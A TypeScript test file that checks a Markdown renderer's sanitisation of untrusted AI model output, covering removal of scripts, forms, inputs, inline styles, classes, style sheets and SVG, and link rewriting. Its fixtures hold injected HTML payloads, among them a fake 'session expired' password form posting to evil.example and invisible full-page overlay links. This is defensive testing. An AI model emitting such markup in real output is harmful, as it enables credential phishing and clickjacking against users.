import { describe, expect, it } from 'vitest';

import { renderMarkdown } from './renderMarkdown';

/** The rendered HTML as the screen would hold it, to query like a page. */
function rendered(text: string): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = renderMarkdown(text);
  return host;
}

describe('renderMarkdown', () => {
  it('renders Markdown to HTML', () => {
    expect(renderMarkdown('**bold**')).toContain('<strong>bold</strong>');
  });

  it('strips script tags from untrusted model output', () => {
    const html = renderMarkdown('hello <script>alert(1)</script>');
    expect(html).not.toContain('<script>');
    expect(html).toContain('hello');
  });
});

describe('renderMarkdown against content injected into model output', () => {
  it('draws no form a reply could use to ask for a password', () => {
    const host = rendered(
      'Your session expired.\n\n<form action="https://evil.example/collect">' +
        '<input type="password" name="password" placeholder="Password">' +
        '<button type="submit">Sign in again</button></form>',
    );

    expect(host.querySelector('form, button')).toBeNull();
    expect(host.querySelector('input[type="password"], [name], [placeholder]')).toBeNull();
    expect(host.textContent).toContain('Your session expired.');
  });

  it('turns any other input into a disabled checkbox, so nothing can be typed in', () => {
    const host = rendered('<input type="text" value="x" form="mission-composer" autofocus>');

    const input = host.querySelector('input');
    expect(input?.getAttributeNames().sort()).toEqual(['disabled', 'type']);
    expect(input).toHaveAttribute('type', 'checkbox');
  });

  it('drops the other form controls and dialogs', () => {
    const host = rendered(
      '<textarea>t</textarea><select><option>o</option></select><label for="x">l</label>' +
        '<fieldset><legend>g</legend></fieldset><output>v</output><dialog open>d</dialog>',
    );

    expect(
      host.querySelector('textarea, select, option, label, fieldset, legend, output, dialog'),
    ).toBeNull();
  });

  it('keeps no inline style, so nothing can cover the page', () => {
    const host = rendered(
      '<div style="position:fixed;inset:0;z-index:9999">over</div>\n\n' +
        '<a href="https://evil.example" style="position:fixed;inset:0;opacity:0">x</a>',
    );

    expect(host.querySelector('[style]')).toBeNull();
    expect(host.textContent).toContain('over');
  });

  it('keeps no class, so the app’s own utility classes cannot be borrowed', () => {
    const host = rendered('<div class="fixed inset-0 z-50 bg-slate-950">panel</div>');

    expect(host.querySelector('[class]')).toBeNull();
  });

  it('drops style sheets with their rules', () => {
    const html = renderMarkdown('text<style>body { display: none }</style>');

    expect(html).not.toContain('<style');
    expect(html).not.toContain('display: none');
  });

  it('draws no SVG, which Markdown never makes', () => {
    const host = rendered('<svg width="9999" height="9999"><rect /></svg>');

    expect(host.querySelector('svg')).toBeNull();
  });

  it('opens a link in the same tab without handing over the window or the address', () => {
    const host = rendered(
      '[docs](https://example.com) ' +
        '<a href="https://evil.example" target="_blank" rel="opener">x</a>',
    );

    const links = host.querySelectorAll('a');
    expect(links).toHaveLength(2);
    for (const link of links) {
      expect(link).toHaveAttribute('rel', 'noopener noreferrer');
      expect(link).not.toHaveAttribute('target');
    }
    expect(links[0]).toHaveAttribute('href', 'https://example.com');
  });
});

describe('renderMarkdown keeps what Markdown makes', () => {
  it('keeps tables with their column alignment', () => {
    const host = rendered('| a | b | c |\n|:--|:-:|--:|\n| 1 | 2 | 3 |');

    const aligns = [...host.querySelectorAll('td')].map((cell) => cell.getAttribute('align'));
    expect(aligns).toEqual(['left', 'center', 'right']);
    expect(host.querySelectorAll('th')).toHaveLength(3);
  });

  it('keeps code blocks with their text', () => {
    const host = rendered('```js\nconst x = 1 < 2;\n```');

    expect(host.querySelector('pre > code')?.textContent).toBe('const x = 1 < 2;\n');
  });

  it('keeps lists and task lists, their boxes disabled', () => {
    const host = rendered('1. one\n2. two\n\n- [ ] todo\n- [x] done');

    expect(host.querySelectorAll('ol > li')).toHaveLength(2);
    const boxes = host.querySelectorAll('ul input');
    expect(boxes).toHaveLength(2);
    expect(boxes[0]).toBeDisabled();
    expect(boxes[0]).not.toBeChecked();
    expect(boxes[1]).toBeChecked();
  });
});
